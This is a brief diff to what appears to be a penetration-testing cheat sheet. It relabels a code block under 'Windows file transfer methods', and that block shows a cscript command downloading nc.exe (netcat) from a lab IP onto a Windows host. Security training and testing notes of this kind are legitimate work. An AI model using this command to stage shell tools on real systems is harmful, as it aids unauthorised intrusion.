@@ -417,7 +417,7 @@ Net Use:
 * https://www.robvanderwoude.com/ntadmincommands.php#Cmd15
 
 Windows file transfer methods:
-```vbs
+```powershell
 # Run: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
 $ cscript wget.vbs http://10.11.0.42/nc.exe
 
